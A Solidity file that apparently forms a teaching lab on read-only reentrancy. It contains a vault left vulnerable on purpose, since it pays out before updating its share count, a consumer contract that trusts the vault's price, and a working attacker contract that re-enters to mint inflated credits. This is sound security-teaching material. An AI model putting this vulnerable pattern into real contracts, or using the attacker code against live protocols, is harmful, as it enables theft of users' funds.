// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

/// @notice ETH share vault. `withdraw` sends ETH out before updating
///         `totalShares` — so during the external call the *view*
///         `sharePrice()` returns a temporarily-deflated price:
///         `balance` already dropped, `totalShares` still high.
///
///         No state mutator is re-entered, so single-function reentrancy
///         guards on `withdraw` do not save consumers reading `sharePrice`.
contract ShareVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    function deposit() external payable {
        require(msg.value > 0, "no value");
        uint256 sh;
        if (totalShares == 0 || address(this).balance == msg.value) {
            sh = msg.value;
        } else {
            uint256 balBefore = address(this).balance - msg.value;
            sh = (msg.value * totalShares) / balBefore;
        }
        shares[msg.sender] += sh;
        totalShares += sh;
    }

    function withdraw(uint256 sh) external {
        require(shares[msg.sender] >= sh, "insufficient");
        uint256 amount = (sh * address(this).balance) / totalShares;
        shares[msg.sender] -= sh;
        // BUG (read-only reentrancy): external call before totalShares
        //      update leaves the view `sharePrice()` returning a stale
        //      (deflated) value for the duration of the call.
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        totalShares -= sh;
    }

    /// @notice Wei per 1e18 shares. Manipulable during a re-entry window.
    function sharePrice() external view returns (uint256) {
        if (totalShares == 0) return 1 ether;
        return (address(this).balance * 1e18) / totalShares;
    }

    receive() external payable {}
}

/// @notice External consumer that trusts `vault.sharePrice()` as an
///         oracle. Mints "credits" inversely proportional to the price:
///         the lower the price, the more credits per wei.
///
///         Normal price `1e18` → 1 credit per wei of `weiAmount`.
///         Stale price `0.1e18` → 10 credits per wei. Read-only reentry
///         lets an attacker observe this stale price and pocket the
///         inflated credits.
contract PriceConsumer {
    ShareVault public immutable vault;

    mapping(address => uint256) public credits;

    constructor(ShareVault v) {
        vault = v;
    }

    /// @notice Mint credits for `recipient` at the current spot share price.
    function mintCredits(address recipient, uint256 weiAmount) external {
        uint256 price = vault.sharePrice();
        require(price > 0, "bad price");
        credits[recipient] += (weiAmount * 1e18) / price;
    }
}

/// @notice Per-user attacker that performs the deposit/withdraw and,
///         during the vault's external call, asks the consumer to mint
///         credits using the (now stale, deflated) share price.
contract ReadOnlyAttacker {
    ShareVault public immutable vault;
    PriceConsumer public immutable consumer;
    address public immutable owner;
    bool internal _attacking;
    uint256 internal _depositShares;

    constructor(ShareVault v, PriceConsumer c, address o) {
        vault = v;
        consumer = c;
        owner = o;
    }

    function attack() external payable {
        require(msg.sender == owner, "only owner");
        require(msg.value > 0, "bait > 0");
        vault.deposit{value: msg.value}();
        _depositShares = vault.shares(address(this));
        _attacking = true;
        vault.withdraw(_depositShares);
        _attacking = false;
    }

    receive() external payable {
        if (_attacking) {
            _attacking = false; // single hop
            // During this call: vault.balance has already dropped,
            // totalShares hasn't. sharePrice() reads stale-low.
            consumer.mintCredits(address(this), 1 ether);
        }
    }

    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @notice Multi-tenant lab. Each user gets a personal
///         `(vault, consumer, attacker)` triple. The lab seeds the vault
///         with a small "innocent depositor" stake so the share price
///         drop during withdraw is large and observable.
contract ReadOnlyLab {
    uint256 public constant SEED_DEPOSIT = 0.1 ether;
    /// @notice credits threshold for solved. Honest single-tx interaction
    ///         (1 ETH at price 1e18) would only mint 1e18 credits. The
    ///         exploit inflates that by ~10×.
    uint256 public constant CREDIT_THRESHOLD = 5e18;

    struct Instance {
        ShareVault vault;
        PriceConsumer consumer;
        ReadOnlyAttacker attacker;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address consumer, address attacker);

    receive() external payable {}

    function createInstance() external returns (address vault, address consumer, address attacker) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED_DEPOSIT, "lab underfunded");

        ShareVault v = new ShareVault();
        PriceConsumer c = new PriceConsumer(v);
        ReadOnlyAttacker a = new ReadOnlyAttacker(v, c, msg.sender);

        v.deposit{value: SEED_DEPOSIT}();   // innocent depositor

        _instances[msg.sender] = Instance(v, c, a);
        emit InstanceCreated(msg.sender, address(v), address(c), address(a));
        return (address(v), address(c), address(a));
    }

    function vaultOf(address user) external view returns (ShareVault) {
        return _instances[user].vault;
    }

    function consumerOf(address user) external view returns (PriceConsumer) {
        return _instances[user].consumer;
    }

    function attackerOf(address user) external view returns (ReadOnlyAttacker) {
        return _instances[user].attacker;
    }

    /// @notice Solved when the consumer minted inflated credits to the
    ///         user's attacker contract.
    function isSolved(address user) external view returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return inst.consumer.credits(address(inst.attacker)) >= CREDIT_THRESHOLD;
    }
}
